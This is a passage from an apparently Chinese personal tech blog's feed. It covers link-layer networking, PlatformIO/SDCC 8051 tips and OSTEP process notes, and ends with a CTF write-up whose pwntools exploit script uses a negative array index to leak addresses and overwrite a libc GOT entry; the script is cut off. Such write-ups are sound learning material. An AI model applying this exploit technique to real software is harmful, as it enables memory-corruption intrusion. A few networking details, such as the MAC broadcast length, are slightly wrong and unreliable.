0可以直接左移掉，概括起来来说就是高位为1的时候进行模2运算，之后进行移位；高位为0的时候单纯地进行移位操作</p><p><a href="https://www.cnblogs.com/Zeker62/p/15046165.html">https://www.cnblogs.com/Zeker62/p/15046165.html</a></p><h2 id="多路访问链路"><a href="#多路访问链路" class="headerlink" title="多路访问链路"></a>多路访问链路</h2><h3 id="信道划分协议"><a href="#信道划分协议" class="headerlink" title="信道划分协议"></a>信道划分协议</h3><ul><li><p>时分复用：Time Division Multiplexing，TDM</p><p><img src="/2023/09/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230928104649847.png" alt="image-20230928104649847"></p><p>时间划分为时间帧，时间帧划分为时隙，每个时隙分给一个用户</p></li><li><p>频分多路复用: Frequency Division Multiplexing,FDM</p></li><li><p>码分多址 (Code Division Multiple Access, CDMA)</p><p>不同节点不同编码</p></li></ul><p>🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊🕊</p><h2 id="局域网LAN"><a href="#局域网LAN" class="headerlink" title="局域网LAN"></a>局域网LAN</h2><p>local area network</p><p>48位mac地址用来局域网内寻址，用于使帧从一个网卡传递到与其物理连接的另一个网卡(ip地址主要是用来做子网路由，单独路由每个ip太多了，所有用网络号一样的子网路由)</p><p>前24位地址用来表示硬件厂商编号，后24为该厂商网卡序列号</p><p>mac广播地址为ff ff ff ff ff ff ff ff</p><h3 id="地址解析协议"><a href="#地址解析协议" class="headerlink" title="地址解析协议"></a>地址解析协议</h3><p>address resolution protocol，arp</p><p>arp工作在局域网，将ip地址解析为mac地址</p><h3 id="以太网"><a href="#以太网" class="headerlink" title="以太网"></a>以太网</h3><p>以太网帧结构</p><p><img src="/2023/09/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E9%93%BE%E8%B7%AF%E5%B1%82/image-20230928183946827.png" alt="image-20230928183946827"></p><ul><li>preamble前同步码(8字节) <ul><li>前七个字节 10101010 + 后一个字节 10101011</li><li>用来同步接收方和发送方的时钟速率使得接收方将自己的时钟调到发送端的时钟从而可以按照发送端的时钟来接收所发送的帧</li></ul></li><li>dest address 目标mac地址(6字节)</li><li>source address 源目标地址(6字节)</li><li>tpye类型(2字节)<ul><li>指出高层协 (大多情况下是IP，但也支持其它网络层协议 Novell IPX 和 AppleTalk)</li></ul></li><li>数据data(46~1500字节)<ul><li>ip数据报，以太网最大传输单元MTU最大1500，ip数据报最小46字节</li></ul></li><li>CRC校验码(四字节)</li></ul><p>以太网提供无连接不可靠服务，crc校验不通过就扔了，也不会告诉发送方</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PlatformIO搭配clion或vscode踩坑记录</title>
      <link href="/2023/09/25/PlatformIO/"/>
      <url>/2023/09/25/PlatformIO/</url>
      
        <content type="html"><![CDATA[<p>好吧，我是“颜狗”，⚠keil⚠</p><p>缺点就是不支持调试52rc <a href="https://docs.platformio.org/en/latest/boards/intel_mcs51/STC89C52RC.html#">https://docs.platformio.org/en/latest/boards/intel_mcs51/STC89C52RC.html#</a></p><p><img src="/2023/09/25/PlatformIO/image-20230926224013694.png" alt="image-20230926224013694"></p><p>sdcc其实有调试工具sdcdb，但我觉得那是一坨shit(难道我的打开方式不对?)</p><h2 id="PlatformIO开发51"><a href="#PlatformIO开发51" class="headerlink" title="PlatformIO开发51"></a>PlatformIO开发51</h2><p>官方手册 <a href="https://docs.platformio.org/page/projectconf.html">https://docs.platformio.org/page/projectconf.html</a></p><p>platformio.ini教程 <a href="https://www.bilibili.com/video/BV16X4y1m7AK/">https://www.bilibili.com/video/BV16X4y1m7AK/</a></p><p>platformio.ini 能用配置</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[platformio]</span><br><span class="line">include_dir = C:\Users\zbx\.platformio\packages\toolchain-sdcc\include</span><br><span class="line">[env:STC89C52RC]</span><br><span class="line">platform = intel_mcs51</span><br><span class="line">board = STC89C52RC</span><br><span class="line">upload_flags =</span><br><span class="line">    -p</span><br><span class="line">    $UPLOAD_PORT</span><br><span class="line">upload_command = stcgal $UPLOAD_FLAGS $SOURCE</span><br></pre></td></tr></table></figure><p>一些博客教程</p><p><a href="https://nu-ll.github.io/2021/02/24/PlatformIO%E4%BD%BF%E7%94%A8%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/">https://nu-ll.github.io/2021/02/24/PlatformIO%E4%BD%BF%E7%94%A8%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/</a></p><p><a href="https://bannirui.github.io/2023/02/28/C51%E5%8D%95%E7%89%87%E6%9C%BA%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/">https://bannirui.github.io/2023/02/28/C51%E5%8D%95%E7%89%87%E6%9C%BA%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</a></p><p>刚开始补全不好用改下下面头文件</p><p>8052.h</p><p><img src="/2023/09/25/PlatformIO/image-20230926220532073.png" alt="image-20230926220532073"></p><p>8051.h</p><p><img src="/2023/09/25/PlatformIO/image-20230926220553512.png" alt="image-20230926220553512"></p><p>愉快补全</p><p><img src="/2023/09/25/PlatformIO/image-20230926220702006.png" alt="image-20230926220702006"></p><h2 id="keil，sdcc库不同点"><a href="#keil，sdcc库不同点" class="headerlink" title="keil，sdcc库不同点"></a>keil，sdcc库不同点</h2><p>Migration Keil 2 SDCC：<a href="https://www.infineon.com/dgdl/AP0806510_XC800_Migration_Keil_2_SDCC.pdf?folderId=db3a30431375fb1a01138c57204603bd&fileId=db3a304314dca389011517efc5860d61&ack=t">https://www.infineon.com/dgdl/AP0806510_XC800_Migration_Keil_2_SDCC.pdf?folderId=db3a30431375fb1a01138c57204603bd&amp;fileId=db3a304314dca389011517efc5860d61&amp;ack=t</a></p><p>sdcc manual <a href="https://sdcc.sourceforge.net/doc/sdccman.pdf">https://sdcc.sourceforge.net/doc/sdccman.pdf</a></p><p>中断回调函数定义中x标识的是中断号</p><p>比如</p><table><thead><tr><th>中断号</th><th>含义</th></tr></thead><tbody><tr><td>0</td><td>外部中断0</td></tr><tr><td>1</td><td>定时器中断0</td></tr><tr><td>2</td><td>外部中断1</td></tr><tr><td>3</td><td>定时器中断1</td></tr><tr><td>4</td><td>串口中断</td></tr></tbody></table><table><thead><tr><th></th><th>sdcc</th><th>keil</th></tr></thead><tbody><tr><td>头文件</td><td>8052.h&#x2F;8051.h</td><td>reg52.h&#x2F;reg51.h</td></tr><tr><td>端口控制口定义</td><td>#define LED1 P2_0</td><td>sbit LED1 &#x3D; P2 ^ 0;</td></tr><tr><td>中断回调定义</td><td>void time1() __interrupt(x) {}</td><td>void time1() interrupt 3 using 2</td></tr></tbody></table><p>keil c 的中断<br>void SerialComm(void ) interrupt 4 ;<br>{<br>}</p><p>sdcc 的中断<br>void SerialComm(void) __interrupt 4;<br>{<br>}</p><p>sdcc 没有_nop()_ , 可用如下自定义宏代替: #define _nop()_ __asm NOP __endasm ps: sdcc里用__asm xxx __endasm来做内联汇编</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> LED P00</span></span><br><span class="line">LED = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>这种宏定义的方式在SDCC中不支持。可以替换为以下方式：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> LED(x) P00=x</span></span><br><span class="line">LED(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>在反转引脚时，不要使用<strong>取反（P00 &#x3D; ~P00）</strong>，而应该使用<strong>非（P00 &#x3D; !P00）</strong>运算；因为 sdcc 会默认进行类型提升，然后进行取反</p><p><strong>sdcc简单示例</strong> </p><p><a href="https://doc.itprojects.cn/0015-zhishi.89c51/index.html#/">https://doc.itprojects.cn/0015-zhishi.89c51/index.html#/</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:13&amp;&amp;14 内核如何启动，进程创建及进程地址空间</title>
      <link href="/2023/09/23/OSTEP-13-14-Process-and-Address-Spaces/"/>
      <url>/2023/09/23/OSTEP-13-14-Process-and-Address-Spaces/</url>
      
        <content type="html"><![CDATA[<h2 id="操作系统如何启动大体过程"><a href="#操作系统如何启动大体过程" class="headerlink" title="操作系统如何启动大体过程"></a>操作系统如何启动大体过程</h2><p><strong>1.CPU上电进行CPU Reset</strong></p><p>使cpu有一个具体初始的状态(这是一个软硬间约定)，对于x86来说 规范定义在64-ia-32-architectures-software-developer-system-第3卷的Chapter 9</p><ul><li><code>CR0 = 0x60000010</code><ul><li>16-bit 模式</li></ul></li><li><code>EIP = 0x0000fff0 CS = 0xf000</code></li><li><code>EFLAGS = 0x00000002</code><ul><li>interrupt disabled</li></ul></li><li>………</li></ul><p>qemu利用-S停到第一条指令和手册完全一样(对于模拟也就是“抄”手册)</p><p><img src="/2023/09/23/OSTEP-13-14-Process-and-Address-Spaces/image-20230924183932737.png" alt="image-20230924183932737"></p><p><strong>2.reset后执行事先在cs:ip处的ROM存储的厂商提供的firmware(固件)，<code>ffff0</code> 处通常是一条向 firmware 跳转的 jmp 指令</strong></p><p>比如我们qemu -S停在第一条指令</p><p><img src="/2023/09/23/OSTEP-13-14-Process-and-Address-Spaces/image-20231107151656324.png" alt="image-20231107151656324"></p><p>fireware里是传统的bios或者目前流行的uefi</p><ul><li>Legacy BIOS (Basic I&#x2F;O System)</li><li>UEFI (Unified Extensible Firmware Interface)</li><li>区别 <a href="https://www.zhihu.com/question/21672895">https://www.zhihu.com/question/21672895</a></li></ul><p><strong>3.对于较为简单的BIOS来说(虽然过时，但是虚拟机好像都是用的bios)</strong></p><p>BIOS先硬件自检POST(Power-On Self Test 开机自检)，然后BIOS把第一个可引导设备(存储设备)的第一个扇区512字节加载到物理内存的 <code>0x7c00</code> 处(这是一个约定)，然后把pc指向0x7c00(此时还是16bit实模式)，这512个字节又叫主引导记录(Master Boot Record，MBR)，qemu里的bios采用了seabios</p><ul><li>512字节<ul><li>启动代码 446字节<ul><li>检测分区正确性</li><li>加载并跳转到磁盘上的引导程序</li></ul></li><li>硬盘分区表 64字节<ul><li>描述分区状态和位置</li><li>每个分区描述信息占16字节</li></ul></li><li>结束标志 2字节 55AA<ul><li>主引导记录的有效标志，通过这个确定一个设备是可引导的</li></ul></li></ul></li></ul><blockquote><p>Windows为什么一般C盘是系统盘?</p><p>早期的Windows的A，B盘都是软盘，BIOS先去软盘里面读前512个<code>bytes</code>，看最后两个byte是否为<code>55aa</code>，如果是就加载这块磁盘，否则读下一块，如果都不是就启动失败。读完A&#x2F;B盘之后引导到C盘</p></blockquote><p>做内核pwn时的可引导压缩镜像bzImage前512字节 bzImage详细介绍: <a href="https://gohalo.me/post/kernel-compile.html">https://gohalo.me/post/kernel-compile.html</a></p><p><img src="/2023/09/23/OSTEP-13-14-Process-and-Address-Spaces/image-20230924004155691.png" alt="image-20230924004155691"></p><p>emm，为什么会是pe格式，难懂哦</p><p>这512字节的Bootloader进行一系列初始化包括把操作系统代码载入到RAM，随后将控制权交给操作系统</p><p><strong>操作系统内核的启动：CPU Reset → Firmware → Boot loader → Kernel_start()→ …</strong></p><h2 id="状态机视角理解fork-execve-exit"><a href="#状态机视角理解fork-execve-exit" class="headerlink" title="状态机视角理解fork execve exit"></a>状态机视角理解fork execve exit</h2><p><strong>进程就是状态机</strong></p><h3 id="fork-复制一个一模一样的状态机-除了返回值和pid"><a href="#fork-复制一个一模一样的状态机-除了返回值和pid" class="headerlink" title="fork:复制一个一模一样的状态机(除了返回值和pid)"></a>fork:复制一个一模一样的状态机(除了返回值和pid)</h3><p><strong>fork 状态机复制包括持有的所有操作系统对象</strong></p><p>fork完后进入并发，由操作系统调度</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">    fork();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/tmp&gt; ./a.out</span><br><span class="line">Hello</span><br><span class="line">Hello</span><br><span class="line">Hello</span><br><span class="line">Hello</span><br><span class="line">Hello</span><br><span class="line">Hello</span><br><span class="line">grxer@Ubuntu22 ~/tmp&gt; ./a.out | wc -l</span><br><span class="line">8</span><br><span class="line">grxer@Ubuntu22 ~/tmp&gt; ./a.out | cat</span><br><span class="line">Hello</span><br><span class="line">Hello</span><br><span class="line">Hello</span><br><span class="line">Hello</span><br><span class="line">Hello</span><br><span class="line">Hello</span><br><span class="line">Hello</span><br><span class="line">Hello</span><br></pre></td></tr></table></figure><p>造成这种奇怪现象的原因终端的stdout是linebuffer，而管道是linebuffer</p><p><code>linebuffer</code>：遇到<code>\n</code>将缓冲区的内容输出</p><p><code>fullbuffer</code>：到达设定容量后才会将缓冲区的内容输出</p><p>对于fullbuffer在fork时缓冲区里是有“Hello”的，会被复制到新的状态机</p><h3 id="execve-将当前运行的状态机重置成另一个程序的初始状态"><a href="#execve-将当前运行的状态机重置成另一个程序的初始状态" class="headerlink" title="execve:将当前运行的状态机重置成另一个程序的初始状态"></a>execve:将当前运行的状态机重置成另一个程序的初始状态</h3><p><strong>execve “重置” 状态机，但继承持有的所有操作系统对象(文件描述符等)</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> * <span class="type">const</span> argv[] = &#123;</span><br><span class="line">    <span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="literal">NULL</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="type">char</span> * <span class="type">const</span> envp[] = &#123;</span><br><span class="line">    <span class="string">&quot;HELLO=WORLD&quot;</span>, <span class="literal">NULL</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  execve(argv[<span class="number">0</span>], argv, envp);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, World!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/tmp&gt; ./a.out</span><br><span class="line">PWD=/home/grxer/tmp</span><br><span class="line">HELLO=WORLD</span><br><span class="line">SHLVL=0</span><br><span class="line">_=/usr/bin/env</span><br></pre></td></tr></table></figure><p>execve状态机被重置，环境变量变了，printf没被执行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/tmp&gt; strace ./a.out &amp;| grep execve</span><br><span class="line">execve(&quot;./a.out&quot;, [&quot;./a.out&quot;], 0x7ffc2b593b20 /* 56 vars */) = 0</span><br><span class="line">execve(&quot;/bin/bash&quot;, [&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;env&quot;], 0x7fffa6c12100 /* 1 var */) = 0</span><br><span class="line">execve(&quot;/usr/bin/env&quot;, [&quot;env&quot;], 0x561b43500700 /* 4 vars */) = 0</span><br></pre></td></tr></table></figure><blockquote><p>strace用的stderr输出，个人用的fish，fish里的<a href="https://fishshell.com/docs/current/language.html?highlight=control%20operator#:~:text=As%20a%20convenience%2C%20the%20pipe%20%26%7C%20redirects%20both%20stdout%20and%20stderr%20to%20the%20same%20process.%20This%20is%20different%20from%20bash%2C%20which%20uses%20%7C%26.">&amp;|</a>等于bash里的|&amp;，等价于 2&gt;&amp;1 将stderr重定向到stdout</p></blockquote><h3 id="exit-销毁状态机"><a href="#exit-销毁状态机" class="headerlink" title="exit:销毁状态机"></a>exit:销毁状态机</h3><ul><li><code>exit(0)</code> <code>stdlib.h</code> 中声明的<code>libc</code>函数<ul><li>会调用 <code>atexit</code></li><li>libc做一系列用户层面清除(释放TLS，清除缓冲区等等)后调用<code>_exit(0)</code>做内核层面清除</li></ul></li><li><code>_exit(0)</code> - glibc 的 syscall wrapper<ul><li>执行 “<code>exit_group</code>” 系统调用终止<strong>整个进程(所有线程)</strong></li><li>不会调用 <code>atexit</code></li></ul></li><li><code>syscall(SYS_exit, 0)</code><ul><li>执行 “<code>exit</code>” 系统调用终止<strong>当前线程</strong></li><li>不会调用 <code>atexit</code></li></ul></li></ul><h3 id="操作系统启动后"><a href="#操作系统启动后" class="headerlink" title="操作系统启动后"></a>操作系统启动后</h3><p>控制权给到操作系统后，操作系统会启动一个进程(这个进程必须是一个类似while循环的无终止)，随后Kernel就进入后台，成为 “中断&#x2F;异常处理程序”</p><p>对于我们linux来说会从下面几个路径尝试创建init进程 <a href="https://elixir.bootlin.com/linux/latest/source/init/main.c#L1493">https://elixir.bootlin.com/linux/latest/source/init/main.c#L1493</a></p><p><img src="/2023/09/23/OSTEP-13-14-Process-and-Address-Spaces/image-20230924013930964.png" alt="image-20230924013930964"></p><p><img src="/2023/09/23/OSTEP-13-14-Process-and-Address-Spaces/image-20230924014144178.png" alt="image-20230924014144178"></p><p>随后由init进程利用fork execve exit三个系统调用进行长久的状态机复制，重置，终止，配合其他系统调用创造整个操作系统世界</p><h2 id="进程地址空间"><a href="#进程地址空间" class="headerlink" title="进程地址空间"></a>进程地址空间</h2><p>测试程序动态链接</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>地址空间</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">555555554000-555555555000 r--p 00000000 08:03 4983575                    /home/grxer/tmp/a.out</span><br><span class="line">555555555000-555555556000 r-xp 00001000 08:03 4983575                    /home/grxer/tmp/a.out</span><br><span class="line">555555556000-555555557000 r--p 00002000 08:03 4983575                    /home/grxer/tmp/a.out</span><br><span class="line">555555557000-555555558000 r--p 00002000 08:03 4983575                    /home/grxer/tmp/a.out</span><br><span class="line">555555558000-555555559000 rw-p 00003000 08:03 4983575                    /home/grxer/tmp/a.out</span><br><span class="line">7ffff7c00000-7ffff7c28000 r--p 00000000 08:03 2885986                    /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7ffff7c28000-7ffff7dbd000 r-xp 00028000 08:03 2885986                    /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7ffff7dbd000-7ffff7e15000 r--p 001bd000 08:03 2885986                    /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7ffff7e15000-7ffff7e19000 r--p 00214000 08:03 2885986                    /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7ffff7e19000-7ffff7e1b000 rw-p 00218000 08:03 2885986                    /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7ffff7e1b000-7ffff7e28000 rw-p 00000000 00:00 0                             //mmap出的匿名映射 对于一些较大的未初始化全局数组就是这样映射的</span><br><span class="line">7ffff7fa4000-7ffff7fa7000 rw-p 00000000 00:00 0                             //mmap出的匿名映射</span><br><span class="line">7ffff7fbb000-7ffff7fbd000 rw-p 00000000 00:00 0                             //mmap出的匿名映射</span><br><span class="line">7ffff7fbd000-7ffff7fc1000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffff7fc1000-7ffff7fc3000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">7ffff7fc3000-7ffff7fc5000 r--p 00000000 08:03 2885983                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7ffff7fc5000-7ffff7fef000 r-xp 00002000 08:03 2885983                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7ffff7fef000-7ffff7ffa000 r--p 0002c000 08:03 2885983                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7ffff7ffb000-7ffff7ffd000 r--p 00037000 08:03 2885983                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7ffff7ffd000-7ffff7fff000 rw-p 00039000 08:03 2885983                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">7ffffffdd000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]</span><br></pre></td></tr></table></figure><h3 id="vsyscall–-gt-vdso"><a href="#vsyscall–-gt-vdso" class="headerlink" title="vsyscall–&gt;vdso"></a>vsyscall–&gt;vdso</h3><p>具体看：<a href="https://zhuanlan.zhihu.com/p/436454953">https://zhuanlan.zhihu.com/p/436454953</a></p><p>virtual dynamic shared object</p><p>可以直接访问部分内核的共享页，共享页每隔一定时间刷新一次，对于一些只需要读内核的系统调用不需要陷入内核，vsyscall地址固定但是已经弃用了</p><p>man vdso手册后面给出了各个架构vdso支持的函数</p><h3 id="execve后"><a href="#execve后" class="headerlink" title="execve后"></a>execve后</h3><p>进程只有少量内存映射</p><ul><li>静态链接：代码、数据、堆栈、堆区</li><li>动态链接：代码、数据、堆栈、堆区、INTERP (ld.so)</li></ul><p><img src="/2023/09/23/OSTEP-13-14-Process-and-Address-Spaces/image-20230924133834423.png" alt="image-20230924133834423"></p><p>刚开始没有libc，动态加载器ld利用一系列系统调用加载libc.so</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">mmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags, <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">munmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length, <span class="type">int</span> prot)</span>;</span><br></pre></td></tr></table></figure><p><img src="/2023/09/23/OSTEP-13-14-Process-and-Address-Spaces/image-20230924141641580.png" alt="image-20230924141641580"></p><p>elf告诉操作系统进程如何加载，操作系统利用mmap去映射磁盘，懒加载(使用时触发缺页中断)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023 羊城杯决赛</title>
      <link href="/2023/09/21/2023-ycbfinal/"/>
      <url>/2023/09/21/2023-ycbfinal/</url>
      
        <content type="html"><![CDATA[<h3 id="arrary-index-bank"><a href="#arrary-index-bank" class="headerlink" title="arrary_index_bank"></a>arrary_index_bank</h3><p>给了后门</p><p>意识到了数组下标可以为负数来在栈上无限后溢来泄露libc，栈和pie，从而修改栈区上面libc里的值，这里选择了puts函数会利用libc里的got，改为后门</p><p><img src="/2023/09/21/2023-ycbfinal/image-20230921231258929.png" alt="image-20230921231258929"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libcelf=elf.libc</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,<span class="string">&#x27;b *&#x27;</span>+x)</span><br><span class="line">dbpie = <span class="keyword">lambda</span> x: gdb.attach(io,<span class="string">&#x27;b *$rebase(&#x27;</span>+x+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    p(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"><span class="comment">#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x00144D&#x27;)</span></span><br><span class="line"><span class="comment"># dbpie(&#x27;0x014C6&#x27;)</span></span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(-<span class="number">0x8000000000000000</span> + <span class="number">7</span>).encode())</span><br><span class="line">sla(<span class="string">b&#x27;unt?&#x27;</span>,<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;[-1] = &#x27;</span>)</span><br><span class="line">pie=<span class="built_in">int</span>(r(<span class="built_in">len</span>(<span class="string">&#x27;93824992236582&#x27;</span>)),<span class="number">10</span>)-<span class="number">0x1426</span></span><br><span class="line">backdoor=<span class="number">0x1310</span>+pie</span><br><span class="line">p(<span class="string">&#x27;pie&#x27;</span>,pie)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;unt?&#x27;</span>,<span class="string">b&#x27;-2&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;[-2] = &#x27;</span>)</span><br><span class="line">stack_base=<span class="built_in">int</span>(r(<span class="built_in">len</span>(<span class="string">&#x27;140737488347072&#x27;</span>)),<span class="number">10</span>)-<span class="number">0x30</span></span><br><span class="line">p(<span class="string">&#x27;stack_base&#x27;</span>,stack_base)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;unt?&#x27;</span>,<span class="string">b&#x27;-18&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;[-18] = &#x27;</span>)</span><br><span class="line">_IO_2_1_stdin_=<span class="built_in">int</span>(r(<span class="built_in">len</span>(<span class="string">&#x27;140737488347072&#x27;</span>)),<span class="number">10</span>)</span><br><span class="line">p(<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>,_IO_2_1_stdin_)</span><br><span class="line">libcbase=find_libc(<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>,_IO_2_1_stdin_)</span><br><span class="line">attach= <span class="number">0x219098</span>+libcbase</span><br><span class="line">p(<span class="string">&#x27;attach&#x27;</span>,attach)</span><br><span 